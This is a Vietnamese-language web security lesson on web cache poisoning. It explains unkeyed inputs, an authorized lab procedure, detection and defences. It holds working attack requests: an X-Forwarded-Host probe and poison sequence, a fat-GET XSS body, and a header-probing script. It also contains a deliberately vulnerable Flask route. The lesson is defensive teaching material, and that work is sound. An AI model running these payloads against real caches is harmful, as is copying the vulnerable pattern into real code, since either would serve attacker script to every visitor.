---
schema_version: 1
id: WEB-A08-WEB-CACHE-POISONING
title: "Web Cache Poisoning"
slug: web-cache-poisoning
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-349
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Web Cache Poisoning

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Web Cache Poisoning bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống Web Cache Poisoning và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Hãy tưởng tượng một người phát thư siêu tốc của một công ty lớn (Web Cache). Để phát thư nhanh, người này lập ra một cuốn sổ tay phân loại thư dựa trên các thông tin ghi trên phong bì: "Phương thức gửi + Địa chỉ người nhận + Tiêu đề thư" (những thông tin này được gọi là **cache key**). Nếu có hai bức thư giống hệt nhau về các thông tin này gửi đến, người phát thư sẽ lấy luôn bản sao thư cũ ra giao cho nhanh, thay vì phải chạy vào kho lục lọi lại từ đầu.
Tuy nhiên, bên trong bức thư hoặc trên mép phong bì có thể ghi thêm một số lời nhắn phụ như: "Xin hãy gửi kèm tập tài liệu quảng cáo từ trang web X" (những thông tin ngoài lề này không dùng để phân loại thư, gọi là **unkeyed inputs**).

Mặc dù người phát thư không quan tâm đến lời nhắn phụ này khi phân loại (nó không ảnh hưởng đến cache key), nhưng bộ phận soạn thư ở kho (Origin Server) lại đọc nó và thiết kế nội dung thư trả về dựa trên lời nhắn đó.
Đây chính là sơ hở chết người: Người phát thư vẫn nghĩ đây là một bức thư bình thường và lưu bản sao của nó lại để gửi cho những người tiếp theo, mà không biết rằng nội dung bên trong đã bị biến đổi dựa trên các lời nhắn phụ kia.

```
# Normal cache operation flow
Client A ─→ GET /home ─→ [Cache: MISS] ─→ [Origin Server] ─→ Response (cached)
Client B ─→ GET /home ─→ [Cache: HIT]  ─→ Cached Response (served directly)

# Cache key typically includes:
# Key = METHOD + HOST + PATH + QUERY_STRING
# Unkeyed = Headers (X-Forwarded-Host, Cookie, User-Agent, etc.)
```

```python
# Simplified cache logic (pseudocode)
def handle_request(request):
    # Build cache key from specific request components
    cache_key = f"{request.method}|{request.host}|{request.path}|{request.query}"

    cached = cache.get(cache_key)
    if cached:
        return cached  # Cache HIT — return stored response

    # Cache MISS — forward to origin
    response = origin_server.forward(request)  # Unkeyed headers still affect this!

    if response.is_cacheable():
        cache.store(cache_key, response)  # Store response for future requests

    return response
```

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng **Web Cache Poisoning (Đầu độc bộ nhớ đệm Web)** giống như một kẻ xấu lén bỏ thuốc độc vào bể chứa nước công cộng của cả khu phố.
Cụ thể, kẻ tấn công gửi một yêu cầu chứa các lời nhắn phụ (unkeyed input như header `X-Forwarded-Host`) chứa mã độc. Máy chủ gốc xử lý yêu cầu này, tạo ra một trang web bị nhiễm mã độc và gửi lại. Bộ nhớ đệm (Cache) thấy yêu cầu này khớp với phân loại thông thường liền lưu trang nhiễm độc này vào kho chứa của mình.

Kể từ giây phút đó, bể nước đã bị nhiễm độc. Bất kỳ người dùng lương thiện nào khác đến yêu cầu trang web đó đều nhận lại bản sao nhiễm độc được phân phối trực tiếp từ bộ nhớ đệm.
Khác với các hình thức tấn công thông thường chỉ nhắm vào một nạn nhân đơn lẻ, đầu độc bộ nhớ đệm có sức tàn phá trên diện rộng: Mọi người truy cập trang web đó đều sẽ bị dính mã độc cho đến khi bộ nhớ đệm tự động xóa bản sao cũ đi hoặc có người phát hiện để làm sạch.

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** HTML/asset dùng chung trong cache và cache key.
- **Actor, xác thực và role:** anonymous điều khiển unkeyed header/body; user tổng hợp dùng cùng key.
- **Điều kiện khai thác:** input làm đổi response nhưng không nằm trong cache key.
- **Browser, proxy, framework và phiên bản:** reverse proxy/cache và Flask origin được pin với asset .lab.test loopback; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với web cache poisoning, input làm đổi response nhưng không nằm trong cache key. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy reverse proxy/cache và Flask origin được pin với asset .lab.test loopback; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case web cache poisoning; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “input làm đổi response nhưng không nằm trong cache key”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của web cache poisoning; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây là ví dụ lab tối thiểu theo đúng context đã ghi trong annotation. Trước khi dùng, đối chiếu framework/phiên bản, encoding, expected result và risk; chỉ chạy trong fixture local có ủy quyền. Payload mở rộng thuộc `security_cheatsheet.md`; lesson chỉ giữ ví dụ cốt lõi.

**Bước 1: Tìm unkeyed header ảnh hưởng đến response:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-001 -->
<!-- context: HTTP/1.1 request to a disposable reverse-proxy/cache fixture; X-Forwarded-Host is intentionally unkeyed -->
<!-- prerequisites: victim.lab.test and assets.untrusted.lab.test resolve to loopback; cache namespace is unique; one probe; no outbound network -->
<!-- encoding: ASCII HTTP header value; CRLF framing is generated by the harness -->
<!-- expected-result: origin response reflects assets.untrusted.lab.test while the cache trace shows X-Forwarded-Host absent from the key -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Probe with X-Forwarded-Host header — check if it reflects in response
GET /home HTTP/1.1
Host: victim.lab.test
X-Forwarded-Host: assets.untrusted.lab.test

# If the response contains:
# <script src="https://assets.untrusted.lab.test/resources/main.js"></script>
# Then X-Forwarded-Host is reflected but NOT part of cache key!
```

**Bước 2: Gửi request độc hại để poison cache:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-002 -->
<!-- context: HTTP/1.1 request to a disposable cache fixture where X-Forwarded-Host affects HTML but not the cache key -->
<!-- prerequisites: isolated cache namespace and synthetic /home; assets.untrusted.lab.test resolves to loopback; one poison request; no outbound network -->
<!-- encoding: ASCII header value and CRLF generated by the raw-request harness -->
<!-- expected-result: cached /home references the loopback untrusted asset origin and cache trace records the fixture-only entry -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Poison the cache — inject malicious host into cached response
GET /home HTTP/1.1
Host: victim.lab.test
X-Forwarded-Host: assets.untrusted.lab.test

# Response (gets cached with key "GET|victim.lab.test|/home"):
# HTTP/1.1 200 OK
# <link rel="canonical" href="https://assets.untrusted.lab.test/home"/>
# <script src="https://assets.untrusted.lab.test/static/app.js"></script>
```

**Bước 3: Mọi user truy cập /home đều bị ảnh hưởng:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-003 -->
<!-- context: HTTP/1.1 baseline retrieval from the same disposable cache namespace as WEB-A08-WEB-CACHE-POISONING-002 -->
<!-- prerequisites: poison case completed; one synthetic second client; asset origin loopback-only; no outbound network -->
<!-- encoding: ASCII request with harness-generated CRLF -->
<!-- expected-result: second client receives the cached fixture response referencing assets.untrusted.lab.test; cleanup purges the namespace -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Innocent user visits the same URL — receives the poisoned cached response
GET /home HTTP/1.1
Host: victim.lab.test

# Response (from cache — contains attacker's payload):
# <script src="https://assets.untrusted.lab.test/static/app.js"></script>
# ^^^ Attacker's JavaScript executes in every visitor's browser!
```

**Kỹ thuật nâng cao — Fat GET với unkeyed body:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-004 -->
<!-- context: HTTP/1.1 GET body processed by an intentionally vulnerable translation origin but omitted from its cache key -->
<!-- prerequisites: disposable cache namespace; synthetic translation data; exactly one poison and one verification request; no outbound network -->
<!-- encoding: UTF-8 JSON body is 63 bytes; Content-Length is recalculated by the harness if payload changes -->
<!-- expected-result: vulnerable cache serves the marker script string to the verification client; fixed origin ignores/rejects the GET body or keys safely -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Some frameworks process body in GET requests — body is unkeyed
GET /api/translations?lang=en HTTP/1.1
Host: victim.lab.test
Content-Length: 63

{"locales":"en","default_locale":"en<script>alert(1)</script>"}

# If the body influences the response but isn't in the cache key,
# the XSS payload gets cached and served to all users
```

**Công cụ tự động phát hiện — Param Miner:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-005 -->
<!-- context: Python 3.12 requests client probing a disposable cache/origin fixture on victim.lab.test -->
<!-- prerequisites: victim.lab.test resolves to loopback; eight-header allowlist; one baseline plus eight probes; no outbound network -->
<!-- encoding: requests generates HTTP framing; canary is ASCII cache-canary.lab.test -->
<!-- expected-result: output reports only headers whose canary appears in the response but not baseline; result is evidence of reflection, not proof of an unkeyed cache input -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Automated unkeyed header discovery script
import requests

UNKEYED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-URL',
    'X-Rewrite-URL', 'X-Forwarded-Proto', 'X-Host',
    'X-Forwarded-Server', 'Forwarded', 'CF-Connecting-IP'
]

def probe_unkeyed_headers(target_url):
    """Test each header to find those reflected in the response"""
    baseline = requests.get(target_url).text

    for header in UNKEYED_HEADERS:
        canary = "cache-canary.lab.test"  # Reserved local canary value
        response = requests.get(target_url, headers={header: canary})

        if canary in response.text and canary not in baseline:
            print(f"[REFLECTED] {header} → unkeyed and reflected in response!")
        else:
            print(f"[SAFE] {header} — not reflected")

probe_unkeyed_headers("https://victim.lab.test/")
```

## 9. Code dễ bị lỗi và code an toàn

```python
# === VULNERABLE: Reflects X-Forwarded-Host into page without cache key ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/home')
def home():
    # X-Forwarded-Host is used to build asset URLs but NOT in cache key
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.victim.lab.test')
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # DANGEROUS: attacker controls cdn_host via unkeyed header

# === SECURE: Whitelist allowed hosts, ignore unknown forwarded headers ===
ALLOWED_CDN_HOSTS = {'cdn.victim.lab.test', 'static.victim.lab.test'}

@app.route('/home-secure')
def home_secure():
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.victim.lab.test')
    if cdn_host not in ALLOWED_CDN_HOSTS:
        cdn_host = 'cdn.victim.lab.test'  # Fallback to safe default
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # SAFE: only whitelisted CDN hosts are used
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến Web Cache Poisoning, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Chuẩn hóa mọi input làm response thay đổi vào key hoặc loại bỏ trước khi render.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với Web Cache Poisoning, các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

```http
# Include relevant headers in cache key via Vary header
HTTP/1.1 200 OK
Vary: X-Forwarded-Host, Accept-Language, Accept-Encoding
Cache-Control: public, max-age=3600
```
```nginx
# Nginx — strip dangerous headers before forwarding to origin
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
```

- **Tóm tắt**: Ngăn chặn Web Cache Poisoning bằng cách đưa tất cả các input ảnh hưởng đến phản hồi vào cache key, sử dụng tiêu đề Vary và cấu hình CDN an toàn.
- **Các bước chi tiết**:
  - **Đưa tất cả input ảnh hưởng response vào cache key** — dùng `Vary` header:
  - **Loại bỏ unkeyed header không cần thiết** tại tầng proxy trước khi forward:
  - **Không phản ánh header vào response** — tránh dùng header value trong HTML output.
  - **Sử dụng `Cache-Control: private`** cho trang chứa user-specific content.
  - **Giám sát cache hit rate** — tỷ lệ cache hit bất thường có thể là dấu hiệu poisoning.

## 12. Retest

- **Positive case:** với Web Cache Poisoning, luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của Web Cache Poisoning mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **Web Cache**: Bộ nhớ đệm trung gian lưu giữ bản sao các phản hồi từ máy chủ để phân phối nhanh cho người dùng, giúp giảm tải hệ thống.
- **Cache Key**: Chuỗi khóa định danh được tạo ra từ một số thành phần của yêu cầu (như địa chỉ trang web, phương thức gửi) dùng để đối chiếu xem tài nguyên đã có sẵn trong bộ nhớ đệm hay chưa.
- **Unkeyed Inputs**: Các phần dữ liệu của yêu cầu (như các header bổ sung) không tham gia vào việc tạo ra cache key nhưng vẫn được máy chủ gốc xử lý.
- **Origin Server**: Máy chủ gốc xử lý mã nguồn và cơ sở dữ liệu chính của website.
- **Cache MISS**: Trạng thái yêu cầu gửi tới bộ nhớ đệm nhưng chưa có sẵn bản sao, buộc phải chuyển tiếp yêu cầu đến máy chủ gốc.
- **Cache HIT**: Trạng thái bộ nhớ đệm đã có sẵn bản sao yêu cầu và trả về ngay lập tức cho người dùng.
- **Fat GET**: Yêu cầu HTTP sử dụng phương thức GET nhưng có gửi kèm theo phần thân dữ liệu (body), một hành vi không phổ biến có thể gây bối rối cho hệ thống cache.
- **Vary Header**: Header HTTP dùng để hướng dẫn bộ nhớ đệm biết những header nào của client cần được đưa vào để tính toán cache key.
- **Payload**: Đoạn mã độc hoặc dữ liệu được kẻ tấn công sử dụng để khai thác lỗ hổng.

## 16. Bài liên quan và đọc thêm

- [CRLF Injection](../../05-injection/crlf-injection/) — Tấn công chèn các ký tự xuống dòng để phân tách HTTP response, thường được dùng để thêm các header độc hại phục vụ cho Web Cache Poisoning.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/web-cache-poisoning — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S2]** OWASP. https://owasp.org/www-community/attacks/Cache_Poisoning — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/349.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S4]** James Kettle. https://portswigger.net/research/practical-web-cache-poisoning — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
